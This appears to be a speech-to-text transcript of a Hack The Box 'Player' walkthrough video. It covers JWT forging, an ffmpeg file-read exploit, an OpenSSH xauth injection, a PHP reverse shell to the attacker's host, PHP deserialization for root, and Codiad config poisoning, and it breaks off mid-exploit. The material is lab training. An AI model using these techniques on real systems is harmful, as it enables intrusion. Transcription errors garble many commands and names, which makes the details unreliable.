 what's going on YouTube this is Epps I can be doing player from hack the box and I really like this box because there were two solutions to it the intended and unintended and both are really awesome and pretty unique from each other so essentially you're getting two videos and one with this box it starts off with finding three different subdomains dev staging and chat if you're really good at recon and you find the dev one and find the framework being used and do a lot of research you can find a vulnerability in that framework and just pop the box from there but the intended solution involves you finding old backup files and one of the directories that contain a secret to create your own JWT token to let you log in so you create the forged token get access to a different place that is a video processing thing there is a ffmpeg vulnerability that's a local file inclusion to let you get different files and you find credentials that let you log in to SSH but you're in a super limited shell but there is a exploit within that SSH version that lets you read files to let you get a nother file that has credentials to a web upload form so you can upload a PHP or a shell and get a shell in the box and then you can use the su command to switch to the user you had previously and bypass the limited shell additionally you could just look at the running krons on the box and there's a PHP file that runs every minute with two vulnerabilities one being a serialization vulnerability and the other just including a file you may have write access to so with all that being said I'm sure you confuse so let's jump in as always we can begin with the end map so - SC for default scripts as V enumerate versions Oh a output all formats in the end mapped right then call it player and then the IP address which is 10 10 10 145 can take some time to run so I've already ran it looking at the results we have just two ports open the first one being SSH on port 22 and it's banner tells us it's a Ubuntu server we also have HTTP on port 80 and it's banners telling us it's Apache HTTP D and then the nmap script HTTP - title is giving us a 403 forbidden and then this service info right here is telling us the hostname is player htb so let's go take a look at the site to see exactly what the forbidden is maybe it's giving us some type of login prompt that has guest authentication and it doesn't we just get a slash forbidden and oddly enough I don't see player HDB anywhere so I don't know exactly why and map is able to detect the hostname so I'm always curious when a map does something I don't know I don't expect so let's just open up Wireshark and sniff this so going in a Wireshark selecting ton zero because that's the adapter for Open VPN and then just read on the end map script so I'm gonna do and map - end to ignore DNS SC scripts sv enumerate versions - P 80 to only do port 80 and do 10 10 10 145 so let that run we should see everything in Wireshark so we can just press ctrl F to open the find search for the string player htb change the display filter to be a string and then change it from packet list or yeah packet list to packet bytes and search everything and we don't see anything let's just search for player and we get a few hits so right here we see the four three forbidden but down here it's saying server at player htb so let's follow this HTTP request and see what happened so we're good doing a get via HTTP 1.0 and the server tells us it can't find player htb so let's go over here and edit this request and redo what nmap did so go here intercept control are 2 4 - 2 repeater and then if we send this we just see the IP address so let's change it to HTTP 1.0 to kind of mimic what end map did and we still see just the IP address so let's only send that delete everything else and we get server at player HDB so that is how if you don't have all these details that default somehow to player HDB so looking back over this I just send the normal request it's putting the IP address here so I'm gonna change the IP address in this host field to be please subscribe and then click send and we see we have updated the error message to say please subscribe so this host field is reflected here and it's not really interesting to be able to change it it's just interesting to know that if you don't have one it's defaulting to the host name of the box so just a way to get that information and again the default Firefox is to always put what you have in the search bar in this host field so that's why it is saying 10 10 10 145 so with that knowledge let's go and edit our host file so I can close out Wireshark and then just do V Etsy first and then add 10 10 10 145 player htb and we can see if this brings us to a different website so I'm just going to turn intercept off instead of 10 10 10 145 I'm just going to go to player HDB to see if it has some type of virtual host routing that brings us to a different page and it doesn't I'm just going to intercept my request to double-check everything so we can see the host is set to player htb for virtual host routing click forward and we still get this so at this point we have to do a go Buster so I'm gonna do before I do go Buster I'm also going to do a full port scans it's a habit you should get into always doing so we'll just do n map - P - 10 10 10 145 and we forgot - Oh a for output all formats and map player - all ports so let that run and then we need do a go Buster so go Buster dir - you HTTP player HDB - w-4 word list user share word list and then der buster than directory list - 3 medium text and - Oh for an out file and we'll call this go Buster - dir - brute dot L so let that run and I'm also going to do something different I'm just going to use go Buster to do a virtual host brute force as well so the word list I'm using is going to be in the set list package so you can just do app install SEC lists to get this a word list so go Buster - H I'm gonna do V host - H and this is going to brute force virtual host so let's do - you for URL HTTP player dot h TB and then for the word list we're going to specify user share SEC list discovery DNS and let's do subdomains top million I don't really know what a good one is and you can see what that's doing is it's just brute forcing by adding all these subdomains and that word list so what I'm also going to do is - oh four out file and we'll call this go Buster - DNS - player maybe I don't know and I suppose I should do dot out so let's clean up that one I did here so we can delete that and if we do grant - V 403 because if we go back here we see it's putting every status and 403 is a valid one for some reason so I'm going to go Buster - V go Buster - DNS - player and we can just see anything that gave us a 200 so we have dev staging and chat so V Etsy host and ad dev player HDB staging player h TB and chat player h DB and if we go back to a recon tab we can see everything else going we can just rename this whole tab to recon and at this point we have a lot of data so let's open up cherry tree and start taking notes so ctrl + to create a node ctrl shift and to create child node notes hostname leaked by not supplying host just an interesting note and then I'm going to create a div for HTTP and then we're going to create player htb i'm going to create deb player HDB create chat player HDB and we're going to create staging dot player dot h DB so I'm going to take notes on each of these websites so first off is player h DB which is just forbidden and we are currently running go Buster so we can ignore this one the next one I'm going to go to is dev so we can do dev wiht be check what this one's about we can just turn intercept off and we get a login prompt so if I do admin admin incorrect username or password admin and then sequel jetson equals one and I just did the like standard or one equals one thing for sequel injection and that didn't work so we don't really have anything here let's kind of see what this technology that's building this page is so I'm gonna press ctrl you to view the source and we're going to look around to see if it's leaking like is this WordPress Joomla what is this and don't have anything right now the neck other thing we could do is instead of just going to slash we could try like slash index dot HTML and we get not found we can try index dot P HP and it brings this page so we know this page is PHP so if we do a go Buster here we can always add the extension dot PHP and then clicking around if we go to this javascript file we can see this is using the Kodiak framework so go here and framework equals Cody ad and we can say the place we found it and if we look at Cody ad on github we can see that it is currently unnamed unmaintained so it's no longer being updated and one of the intended routes is actually exporting this that I think is exploitable in the latest version but that is an unattended realm so we'll leave that for the end of the video and at this point I guess we can move on maybe we can add it to do and run SQL map but I don't want to run SQL map right now because we have quite a bit going on in recon so let's go and check out chat so chat player dot h DB and we have a internal chat so I'm going to screenshot this with ctrl shift prtscn I can find where that key is there we go and copy this go over to here and then paste the screenshot so we can try clicking around to other chats we don't really have anything so the note is someone saying there was a pen test report and Vincent is saying they mentioned our staging exposing some sensitive files and main domain exposing source code which allows them to access our product before release currently the teams working on a fix and then the project manager says ok be sure to sandbox it so if I had more time and was actually doing the Box I probably go here and create another node saying users and then put all these names so like Vincent and then put poor dev and go down the list and adding everyone because you never know when that comes in handy so the key thing to know is there's probably some exposed files somewhere so we can check the source to see if there's anything else on this page but spoiler I don't think there really is so we won't go and just look at HTTP source for ten minutes the next step was staging so we can go to staging player HDB and this exposed some sensitive files as well so we go here let's see either this is mr. robot core dev Firefox can't load this page okay so that's just an image file just trolling me so the site is getting back up we click around to see what is here everything is static images so I'm not really looking at these we could try to fuzz parameters and update PHP but nothing looks interesting their contact core team and if we go to about play buff nothing happens when I click this so let's do email id name neck and message hello there if we do submit and you get a 501 internal server error so something happened interesting before that and we got text so I'm just gonna try email id let's put a valid email here test at gmail.com click Submit and we see the same thing so what I want to do is intercept this request and see exactly what just happened so get here send it to repeater click go and we're getting some files so ver dub dub dub staging contact PHP so this just leaked probably the location of where staging is its verb dub dub staging and we can guess the location of other places so I should move this to a child nude screenshot chat log paste that and we can do location and do chat player HDB and I'm putting a question mark here because this is unverified so go to dev and we can add location question mark I'm not I wanted to copy the path so chat and dev bird dub dub dub dev and here we can do location DML so it's always important to try to map out exactly where each subdomain is so just having that for now we can go on to see other things so we have Cleveland there is a contact PHP file and database connection failed unknown variable user and ver dub dub dub backup service config so we should definitely check out this file and add this to notes so a config file and then we also know this as a valid file so definitely valid files so just adding these and this will be useful if we ever get like a lfi vulnerability that we know these things exist so let's move on and if we went back I think this even said it no we follow redirection we just get a foot bitten okay so if we go back to a go Buster we do have a slash launcher directory at player HDB so we can check that out so let's go kill this by just turning burp off and we do player dot H to be slashed launcher and we get a page called play buff and it says enter your email so let's enter test at gmail.com and actually intercept this to see if anything interesting happens so good a proxy intercept on send and we're getting a file so let's just send mr. Peter so we can see what happens gives us the ACK a cookie and says 302 found follow redirection and we go back here but a browser didn't add that cookie cell maybe that did it so when we have that cookie it's directing us to this PHP file it looks like which is I think the same thing if we refresh this page sent to repeater it looks to be the same thing so all I did was give us some extra information and also this cookie looks like it's in a format that I can eyeball so I see three strings of base64 separated by periods and we've gone over this a few times and Luke we did it and then craft we also did it this is a JWT token so if we base64 decode and we can see a recon and map also found another port so and in their notes under to do port six eight six six eight six so echo - n base64 - d and we can see the header of JWT token go back here and copy this second piece and go to a code n base this base 64 - D and we can see the contents of the token so project is play buff and access code is whatever this is if I do echo - n paste WC see it's 40 characters so probably a sha-1 sum because I think sha-1 sum is 41 characters let's check this out shot one some awk print one WC - see ya so this is a sha-1 some it looks like and then the last piece of this JWT token is just for signing so it's some type of secret that is ran against this entire thing and that makes it so we can't edit this token we could send this over to hash cat and try cracking it and we could also go back and look at other things specifically in the chat they mentioned staging is exposing some sensitive files and the main domain exposing some source code which allows them to access the product before release so it's kind of a vague hint and burp suite is definitely good at finding this type of thing so if we do player dot HDB and then we could do like right-click engagement tools discover content and what this does is has a thing to like append a bunch of extensions and things that are common in backups to find hidden things but this is a paid feature and I hate showing off paid features so I went ahead and coded an additional thing in go Buster to do this so let's go over the code I added so you can kind of understand it and then we will run it and see what it finds so we run get logged and this will show all the commits and I'm just going to look for the first commit that is not by me and we'll go to Firefox commit so we can just copy this and then we will do a get and paste this so the very first change is on the readme file and I'm just adding a flag discover backup which is dash D so the next thing is CLI CMD don't go and this is again just doing stuff so this flag acts as a boolean and then again more just stuff to handle the argument all the main code is over in this go Buster dojo I'm adding the path library and then adding a bunch of code here and it'll probably be easy to go over this if we open up the whole module so let's go vim paste this in and go to the run function because this is the heart of go Buster at least this dur mood so let's see right here so this is where it's processing all the word list and the very first thing it does is just brute forces it raw so this is just taking each item in that line and doing a get against the URL and recording the response and the size and if there's no error or if there is an error return it otherwise create this ret variable and this is a slice I believe which think of it as just an array and this is where all the pages are eventually going to get added to so if we have a response and the status code is not blacklisted and it's one of the ones on our purse list we will append it to this red thing so this is just a giant structure slice array whatever you want to call it and it'll contain a valid entry and each one will have entity status code size and status and then at the very end of the program when it wants to display output it's just going to go over this and output it so hopefully that makes sense the next thing it's going to do is essentially the same thing but for all the extensions so this is if you do the dash X it will add all the extensions you want and then again does the same thing and appends everything to this rent so here's where the code I add it is and we'll give this a bit more in-depth if the option discover backup is set then do a loop for everything in this slice so four underscore comma R and R is going to be each item in this and this underscore is just a integer just counting off the number it's not really important so I don't use it the next thing is if d dot option status code parsed dot contains a dot status code and that is going to be the page of status code so for every page that we hit that was the status code we cared about and if you do like go back over to this go Buster command status codes by default a 202 or for 301 302 307 401 403 so if the status code on any of the hits was this then we will go into our logic so right now I'm creating the slice file names and we are creating array of backup extensions so for each backup extension I'm going to append the extension to the file name so right here we're going and looping through the squiggly back back to old 1.1 and appending that to the actual file so this becomes like index dot PHP this index dot PHP dot back and you get the gist and then I'm going to strip the extension and do it again so instead of index dot PHP it's gonna do index that which you know when we don't see but like index dot back you'll see quite often index not back to etc so that's what it's doing here and then I also coded something in that I don't think grips wheat does and that looks for like vim swap files so like if we look at our current directory so go Buster go Buster do do it LS la we can see because I'm in vim it created this swap file for me and that is so if we kill it we can do this and it says hey this one file exists and if you want you can press R to recover and go where you left off it's like an autosave feature so we can recover and it just finds those and then again here's a logic that you saw before in the dirt mode an extension mode and that is just to go get all the pages so that is what the change I did does so let's look at how we use this so we're in player and I'm going to go back into verb and we want to get these two files to see backups so we know this file exists this file exists in index dot HTML so I'm just gonna send this to repeater and we'll manually create the word list so copy this V custom word list paste this in and I think the net other one was e to get a target same exact thing but ends in E I'm also going to do D CDE and I can do like a as well but those aren't too important and then do index dot HTML so now I'm going to do go Buster a /opt go Buster go Buster because that's where I have my custom version compiled derp mode - you HTTP player HT b / launcher and then that's w4 word list custom word list and if we just run this we can what it sees nothing too interesting if I add the - D flag that's going to search for all my custom things and we find there is a dot php' with a squiggly mark at the end and if you really wanted to see exactly everything it tried we could do - s for status codes and AD 404 and wait oh we didn't add 404 I said it but didn't type it and it does like a request to a random file and if it doesn't form if it's accepted then it says hey you need to add this wild code switch so because there's no way for go Buster to know exactly what when a file doesn't exist it airs out so we're gonna add the - - wild could to say hey we don't care if you can't identify if it doesn't exist so running this again you can see everything it's searched for so it'll probably be easier if we change this to be one file so I just create the file test so if we just do - W test we can see everything so here's the original file appended a squiggly got rid of the B dot PHP have this quickly dot back got rid of PHP back back - and you get the gist and then down here we're doing the swap file but lot of that said just to find this one single file so you can go over here and grab it and we should also make sure intercept is off and check this file out and it looks like it is some source code so it looks like it's probably going to be the source code to this file and what it's saying is well we get the JWT key and let's see location and XHTML so it's directing us to this page if the JWT token has the variable access code and it's set to this and you remember the other access code maybe we have it in repeater still right here oh we have to pay 60 for decode this so you just go decoder the code as base64 this c0b and this is the access code we currently AB so we want to set the access code in a cookie to be this so the quickest way to do it is just go to JWT IL and it'll help you create the token you could do like the pie JWT python module and do it that way but we've done that a few times so I want to show this way so let's go back to birth and we want to copy it go to JWT oh it just wants the token so let's go to the repeater tab grab this paste it in and can we edit this yes we can so what we want to do is go back to the source code and copy the access code and put it here and we also have to copy the secret key so we'll copy this and paste it in here and now we have a token so let's go and let's see I don't have any requests to that PHP script so let's turn in a set dawn go here copy the URL oh we have it here just go to the PHP script verb sweet was off go to the PHP script and we will update our access token so let's go here copy here paste send to repeater click go and we get an internal server error so let's go take a look at the code and I see just above this it is doing a base64 decode and here we have secret is basic ste 4 encoded so let's just click that option copy the new token and go here paste this in we get a 302 found and it's directing us to the location so we followed the redirection we get a new page so let's go back to the proxy paste that token in forward it and follow the redirection and now a Firefox window is at a new page welcome to play buff compact secure cloud compress and secure your media select a file to upload so let's do what it says and upload a file I'm gonna go to browse and I'm just going to specify Etsy passwd and we're gonna upload that and the key I did to do that is ctrl L to enter this typing window so try to upload passwd I'm gonna intercept it and watch the request as it goes so we're still sending this access jbt token probably not need anymore just submitting the file so we click forward and we go to this index dot PHP we got a token and that looks like a timestamp maybe Oh let's see what is the current epoch time off current epoch time one five seven and that was one seven seven I am way off so that's not a timestamp and I guess we can just click forward and the page says compressing done you can access your media at below so if we look at this link in the bottom left it is in the uploads directory and it's also giving us an AVI file so we try to find it it says not found we search uploads we get it forbidden so we can't do a directory listing here so it's doing something and it's expecting AVI files and a popular codec for processing video is ffmpeg so I'm just gonna do ffmpeg file upload vulnerability and you'll see a lot of things the first one being a payload all the things thing that has a bunch of things to generate LF eyes so I'm going to download this repo so we just go to CD /opt and then get cloned on the payload all the things probably one of the more useful repositories of anything so let's go in here and it was CD not file inclusion where was that payload all the things upload insecure files so I can do an LS and see every like hint it's giving you when you can upload a file you got the zip slip here picture resizing etc but the one we want is this FF or CVE ffmpeg so let's go into this directory and we'll do Jen avi bypass so Python 3 Jen avi bypass and let's see it wants the file name and then the output so we'll do file let's see passwd because we know this exists on the server and then the output avi when do root HDB boxes player and let's make the avi avi passwd AVI so back to the page let us try uploading that so go to browse control L root H B boxes player AVI so we're uploading passwd AVI submit puffed media and not found let's try this again so refresh the page to make sure it's new here submit click on buffed media and it's taking a while to respond so I'm guessing I had just uploaded something in the cache and it did a file again so I'm going to open it in VLC and we see the output of the command and it's currently says staged - dev and I don't have that in my past WD file so I know it's actually running on the server so if I cat @c fast WD grep stage it's not there so we have a way to include files from the server so the first thing I want to do is try checking out the fix dot PHP file and that was in where was it we took notes of it in cherry tree so what's good a staging no chat no dev no I thought I took a note of it notes yeah yeah they go very dub dub dub staging fix PHP so we can close that and paste this in click browse upload submit oft media and we get an avi it's only eight point five kilobytes much smaller than the other one which was over a hundred we get nothing so it looks like we can't really do PHP files so I'm going to try one last thing to see if we can get around that I'm giving you this file parameter I don't know if this is being processed by PHP or VLC so I'm just gonna test out the PHP wrapper to see if it is so if we do PHP colon slash slash and then filter convert dot base64 - encode good /resource is equal to that and we can try this so right now I'm we hoping we can't include it because PHP is processing the file so what I did was tell PHP to base64 encode it which gets rid of the PHP tags so because it's base64 that doesn't exist and it no longer execute it so let's try this click Submit puffed media and it's still 8.5 so that did not do it and I shouldn't let you know I did modify my VLC I forgot to mention it because by default VLC does not allow route to run it so I did this really stupid thing and change that and how I changed it was by running ll trace against VLC or maybe s trace I forget which one I did but anyways examined exactly what the program was doing when it started up and saw it made a call to get EU ID get effective UID so all I did was do which VLC to find out exactly where the binary is and do said - I and then search for a get EU ID and replace it with get PP ID and specify the binary then VLC so now whenever it makes a call to get EU ID and searches for it being equal to 1 0 it now runs get parent P ID which will never return 0 so that's how I'm running VLC as root probably not the smartest thing to do but yeah oh well but back to the l fi of finding files we have confirmed we have l fi against the filesystem we can't get PHP files and we can't use like the PHP filter to do base64 encoding so there's another file that we mentioned so let's go back to cherry tree and that is ver dub dub dub backup service config so let's copy this file and then we will paste it so this will be servus config and the file will be the dub dub dub so backup service config thing so go here browse service config submit both media and now it's taking a little bit longer to return so that's a good sign we have VLC media player it's 300 KB and now we're watching the video if we go like frame by frame we can see the entire contents and right now we have credentials the user telly Jen and a weird password so let's go here Windows key L Oh like that okay let's actually go to Cherry Tree Windows key L to move it over to the left side and we can do thing creds and we can say tele Jen and then the password is D dash B capital C pipe JC exclamation - you EPS / w we have password but definitely useful we could right away go and test this out because there was one place that we had creds - that we or he didn't have crimes but we had a login prompt but no way to login so we could try this tele Jen and well again and we get invalid username and password so that doesn't work none of the files we can really do or try to check if there's a host file that we missed so if we do Python 3 being called this Apache config and then the config location it's probably the same as all my Kali LS Etsy Apache 2 sites available 0 0 0 - default so let's try this let's see Apache 2 sites available slash zero zero zero - default okay and just for a sanity check I want to make sure I did that correct so run file against that can't open so glad a that sanity check default calm so default dot conf and that should be good so let's go back here play buff go back upload Apache config submit off media whenever it takes a long time to load that is a good sign so around 400 KB we can open it and we can see places I've lost my cursor okay so we can see the virtual host chat dev and staging and the locations dev is in demo so we can update this dev is now confirmed it's in demo chat is now confirmed it is indeed in chat we don't know where root is but I'm sure if we go here we may find it route 84 dub dub dub HTML so we have confirmed all of this and that is that other file we can potentially get let's try net any T and I'm going to grab file Proc slash net / tcp so if I kept this on my box proc net TCP we get this which is essentially the output of the netstat command it's actually pulling from this file so if I did NC l v NP 9001 and ran this command again we get yet another port so all these 0 it's mean listen on all interfaces and the one above this is the one 27001 I believe and it's all hex addresses so what we do is just go Python 3 and I'm gonna do integer of 0 X that and see it is indeed 9001 so that's how that's formatted so let's see file proc net tcp avi net looks good so go here then go back and what I'm looking for here is if it's listening on any ports we missed so we can do submit buff to media taking a while to load again always a good sign we can open it up with VLC and let's see did it have more nope we got one a 1e so we can test that one L go back here whoops one a 1e six six eight six zero one six I bet that one is 22 and then zero CEA I bet that is 8003 three or six I show no that's way too would to be eighty so it's got my sequel running this box as well um maybe HTTP is running on like TCP six or something or it's in a different file because we should have seen one 480 but we didn't however that is the way if you did not do a full port scan that you'd find 6 6 8 6 so let's go check out what that board is and map - P 6 6 8 6 - SC - sv 10 10 10 145 and I just like showing other ways to enumerate ports because I normally don't show all ports so I'm showing you normally by the time you need it you can find other ways so we see one banner is OpenSSH 7.2 and the other banner is OpenSSH 6.6 so we definitely have different versions here so let's try logging in with the credentials we have to these SS H's so SSH tele gen at 10 10 10 145 and we can go here to our creds and copy the password paste it we don't get in we can try - boy 6 6 8 6 paste it and we get a connection so if we do LS we get forbidden command hit tab twice to see the commands we have you could also probably type help to see the commands and we just have clear exit help history and hello path and L sudo really not much there so looking at the history there's not much health path was passed an argument so if we do L path slash we get forbidden path so slash home so we can't even do anything there so this shell looks like what kind of screwed we could try commands like less to see if we can escape but we can't so going back to the box there are two different versions of OpenSSH so we can do search boy SSH OpenSSH to see if there's anything here and we're on 7.2 and right here there's one saying there's a denial service well we don't want to crash it so let's not run that one but there is this authenticated X auth command injection so if we copy this and do search poit - X and see exactly how this works it's a crlf injection but a lot of stuff to read so instead of reading let's just run it and see what happens so we can do MV - and rename this file to something that makes more sense like X off - SSH PI save that and if we try running it we get an error message because this is Python - not Python 3 who knows what's gonna happen when you try running this because python 2 suppose Lee's getting wiped off the face of earth January 1st 2020 and it is New Year's Eve for me so I can still use Python - maybe that joke doesn't age well I don't know but definitely a Python 2 script so we can do 10 10 10 145 the port 6 6 8 6 username telly Jen and the password is go to creds and copy this paste that in and it's got a lot of special characters in it so I'm gonna put it in single quotes so looks like we have a few commands read file and write file so the first thing I'm gonna try to do write file and we're going to specify home Cali Jen tip sack and the data we'll just put test see if we can write anything and it said forbidding command over ssh this incident will be reported so doesn't look like that worked we can try SSH - p6 x86 Tali Jen at ten ten ten 1:45 paste LS oh we don't have LS he'll pass home telly Jen double tab yeah nothing so that wasn't a good thing we can try dot right file dub dub dub HTML test and put the contents tip SEC there and then we'd be able to grab it by player HDB slash test and it's not found so doesn't look like we can do that the other option we had was read file so if we go read file and go back to notes and we grab our staging fix PHP file maybe we can read PHP files finally and it looks like we can so looking at this file we can see a bunch of PHP and it's modified fix for Peter and then has something it ends in a equal sign so it kind of looks like base64 but has non basic ste four characters so let's try grabbing Peter going back to creds and putting these in okay that was not copy copy paste and I'm going to do a question mark right now because that's unverified so we could try SSH so SSH Peter and the password copy-paste wrong get rid of six six eight six paste the password wrong and then the other place we could potentially use credentials is on dev so we do Peter paste and we finally have a way to log into this so your project play buff was loaded and said path doesn't exist if we right-click here do new file test cannot create file and if you looked at the error message right off the bat there was the pass cannot be found so let's create a new project let's - please subscribe as the name and the absolute path let's do for dub dub dub HTML and create the project yes absolute path only a weld for / dub dub dub demo home so ver dub dub dub demo home great project yes project please subscribe has been loaded so new file test so if we go to back here demo was on dev so we go demo home maybe test exists so let's go to this lets go deaf player htb demo test not found we just try demo not found test not found play your test not found play a demo not found so it didn't really find anything so we got to figure out exactly how to use this application so search nothing found let's see scan striking a new project upset ver dub dub dub demo yes okay so I didn't need that /home but it still exists weird so we got a install text file so let's see if we can find install text so if we just go player htb install txt not found dev and we got something so this is looking better and that is the same exact file where am I here so definitely have it and let's try uploading a reverse shell and the reverse shell I always like using is user share la you knew what that meant once upon a time but I don't anymore I'll do a PHP or reverse shell I'm just going to call this rev PHP and we'll edit this to look for the IP address and we'll rename it to what my stuff is so 10 10 14 - is my IP address and 9001 if config tun 0 yes I am still 10 10 14 - so let's do NCL vnp 9001 and upload this script so go here upload file click to upload root to HCB boxes player Rev dot PHP completed going down here we see it potentially exist so let's try executing it Rev dot PHP and we get a shell back so let's upgrade a shell to a property T why Python - C import PT y PT y dot spawn then - control-z stty raw - echo hit FG enter and use enter twice and then we can do export term is equal to X term so now we clear the screen so we finally got a shell on this box I normally would start off by running some type of privilege escalation script but it doesn't give us that much information so I'm not gonna waste that time so if we went into opt privilege escalation script awesome sweet when pees that as a script I would normally run but you probably see me running a hundred times there's no need to really run it again so let's just move on and think about what we can do we head creds to tele gen user but we couldn't use it because of the show it's presented so if we can't at sea passwd and grep for telogen we can see its shell is user bin l shell however the su command gives you a - s ability to use a different shell instead of the one default and passwd and you can use shells out of I think Etsy shells so we should be able to use any of these shells so I'm gonna switch to bin bash so I'll do su - s been bash and then telogen and then we go over here into a creds copy the telogen password paste it in and we can switch to that user and get user dot txt and huh it actually wrote hip sac and that was test yeah so I was actually writing files with that Excel thing LS dash L a dub dub dub as HTML like owned by root it is so that's why we cannot write to it but we could have wrote to demo so I think we've just found a different way on the box for dub dub dub demo dub dub double use it can right there so let's try this real quick so let's do Python X auth SSH 10 10 10 14 oh no 10 10 10 145 6 6 8 6 telogen and the password ok dot right file the path will be ver dub dub dub and we are demo so demo test dot PHP and our payload so I'm just going to do PHP and fell and we'll see if this works so let's go back to our shell LS and I don't think I have oh we did it in demo was demo writable I don't know if it was LS l a demo is writable so LS demo slash test dot PHP cannot access let's try that again and put quotes around it so let's do write file test dot PHP and then put quotes around this piece look at our net cat and that file still does not exist unknown command right file oh I didn't do a period first so copy this paste let's see cannot store data most likely to bad characters no spaces or quotes so ah no spaces really limits me so we can try maybe this will go to space I really don't think it does because that's a Bosch thing and test dot PHP doesn't exist so this is gonna be a dead end so let's just exit this it was worth a shot but as the telogen user you could grab user dot txt but the previs columnist box is actually a cron job so the tool I'm going to use to find the cron job is piece by so let's just turn off google this will go to the github and this is another go application I'm just gonna grab the 64 bit small version and then we can move this to a directory so make der dub dub dub CDW dub move downloads piece by and python 3 - m HTTP server and now let's download this so let's put it in I guess the home directory is fine touch test ok we can write here so curl 10 10 14 to 8 thousand piece by 64 s - OH peace by 64 s downloading it and once this finishes we can execute it so chmod plus x peace by dot slash piece by to run so we'll just wait here and see exactly what pops up we got SSH popping up right there SSH so something's are executing SH every 5 seconds but we just got PHP executing this script this ver Lib play buff buff PHP so let's do an LS LA and see the permissions of this only root can edit this file so I'm going to do base 64 against this and we're just going to copy it to my box actually colors are working let's try them here sweet we got syntax highlighting but the tty is a bit screwed up so I'm going to go back here s TTY a rose 34 columns 136 so we can do s TTY Rose 34 calls 136 and do them again and now it's fixed so the very first thing I see is this include so I'm just going to head this file if I was better in vim I just execute a command within the vim terminal but not confident of doing that without fumbling around so we're just going to copy this and look at this file and we can see it is owned by dub dub dub data and read/write so if we just put PHP code in here it would run every minute so this is an unintended thing that we'll do when we do the whole unintended path and that is doing this whole box without that'll whole avi uploading thing just getting a code execution straight off of dev but looking at this we can see a uncie relies call and i had just put out a video a few weeks ago on exploiting PHP serialization and i didn't do that with the intention of this box this was just a pleasant surprise so we can see the class play buff contains a wake up function so this is one of the magic methods that allow us to do badness so i'd really recommend just going to my channel and watching the two PHP on co is asian videos there's a beginner and advanced one so we're just going to do this so i'm just going to create a tak dot PHP and we'll paste this in and we have to put this in PHP tags and let's see public function wake up we don't want that we just want construct I think it's still two things let me do this log file is equal to and we can put any file we want and let's see exactly how it uses it the file put contents though does put a dir first and this is current working directory so any file we want we should put a bunch of dot dot slashes to escape whatever the current working directory is and then let's put a file we can try root SSH authorized keys and then the next item we want is log data so this log data and we want to put a SSH key here so let's generate one with SSH key gen and we can just call this player and then we can cat player dot pub and copy this and I'm also going to save mod 600 player before I forget and we can just paste the key in okay that looks good and then the final thing is to create the object so mob is equal to new play buff and then serialize object echo and I'm going to just put a echo on a new line so PHP attack PHP gives us this object so we can copy it and go back here so very long play buff logs txt oh no it's taking var Lib play buff merge that log play buff merge log so we can do VI for log play buff merge log paste it in and maybe echo - n I probably should put that in single quotes - over Lib play Bluff motovlog so if I cat this file it is a object and we can do a date command and it looks like I literally just missed it and it's a new year on the server but not for me so let's just wait until this finishes so I'm just going to do sleep 35 and pause the video it should be a new minute now so let's go and do SH - I player and do 10 10 10 145 and hopefully we get in which we don't so if we go to see des sh l SL a and we can see the authorized key file was created like 16 seconds ago so that is that way if you didn't have like a dot ssh directory created you could always just drop like a crontab or there's a bunch of other ways you could do it so file write as root you code execution so let's do the unintended method which there's going to be two different ways we get code execution one from when we get Peters credentials and the other one from soon as we find the dev page so the dev page one is funner so that's the one we're going to start with I'm just cleaning up my pains so we can get a fresh start so this should be fine actually it'll be handy if we are root when we do this so Shi player at player htb so now we have a root shell and let's go back here so starting all the way over we're starting at dev player HDB is the logout function let's just clear everything clear history and clear data so we're at dev player HDB and if you went and looked at the source and noticed this and went down the ODI path you would find various exploit paths if you just search we're at Cody at exploit you come across this github which does require user credentials however there are CV ease I'm not positive blog post as a CPU now that I'm thinking about it but there it is a second path this one I'm actually not sure I haven't ran this script I just heard it works so we'll run this one blind and analyze it with burp suite but the other one is how I had done the box and I don't remember how I actually found it but if we search for Jian Xiu get shell cody ad it should pull it up or right here and this is in Chinese and I guess Cali does not have the language pack so it's not displaying that and unfortunately also all the like online translations didn't work on this website that even Dame go the correct one so if we did translate google.com put the website in say it is Chinese and click translate it still doesn't work so since I don't have the language back it's gonna be even tougher to explain this because I don't speak Chinese and I definitely don't speak ASCII but this exploit is kind of half working because what it's saying is if there's a blank code yet instance that is not configured you can poison the config file with the install script to get code execution so let's just go to get a Kodi ad and step through it so github Kodi ad and I think it is let's see components update melt it's let's see project C does he say where's this PHP script that he's showing components install I didn't see install maybe I'm just blind so I'm in components no I'm not now I am yeah install and then process dot PHP so let's get this and open up in our text editor so vim process dot PHP paste it set paste paste it and go through this so this is part of the install script and what it's doing is when you do timezone this is writing the timezone variable and putting whatever you say and you config PHP so what the exploit is is since this is a post we can just put like system run command and run a command however the issue right now is Cody ad is very much installed so we can't just run this script if we try doing the exploit it's just not going to work because it's going to detect files exist and say we can't go however we have virtual host on this box so we can just install it to like chat or something so let's take a note at what we'll have to do so the blog post just has poisoning the config file it doesn't go into using cody add to install from scratch and we don't really have the native install process because we're not running this from shell we can only use this process dot PHP or other files on the server thankfully we only need things out of this process dot PHP the logic of this is essentially if users dot PHP exists exit and this is the reason why we can't just install this over top of each other because when it checks for this users dot PHP file it sees this going to exist and it doesn't proceed so we can verify that by dev player HDB slash what is a data users dot PHP and we see that didn't return over for for errors so this exists and that check is here so we have to make sure those files don't exist and that's where the virtual host helps us so rehearse helps us to the place where writes config has to exist so if we look at is it right save file so save file capital F where it writes this config it has to exist and config is going to be in before then it's going to try to write these files active projects of what not so place to write data and workspace has to exist and there is a make dirt functionality in the script so if we go to mkdir it will make these workspaces if we call the script in the correct way so that's what we want to do because we're going to abuse this to make their data and make the workspace and we're going to do that in the chat directories and then we will call save config to write a poisoned config into chat so hopefully that kind of makes sense at least the process so let's go through this the first thing we have to do is have a post request to components install process dot PHP so let's go to components install process dot PHP let's intercept this request and intercept not on so let's go to proxy intercept on send this into our Peter and change this to a post so the first thing we have to do is make sure these files don't exist and remember there is that file exists call on the user's projects and active and it's generating that by taking the post path and appending these directories so I'm just going to put path is equal to please support on patreon so that's not going to exist because it's going to put the path to please support on patreon slash workspace and that definitely doesn't exist on the server so we got all those settled now we just have to create the directories so we passed this if statement and we're in here it wants user name and password so and username is equal to hips and password is equal to please subscribe so now we'll pass these now at once project name and if project path is not set it defaults to project name so I'm going to ignore a project path and only specify the name and let's see exactly how project path is used we go project path is where our maker is going to be created so let's just set path but project underscore name is equal to verdomme dub chat / data and that may be enough to create the directories so if I did this correctly which I probably didn't will get this working so let's go to chat player htb data not found and you only have a once we get to the actual exploit you only have one chance to make this work so we get it cannot open file but if we refresh we get forbidden so now that data directory exists so that is good the other one we need there's a workspace directory so let's do workspace and click send so we created both directories data and 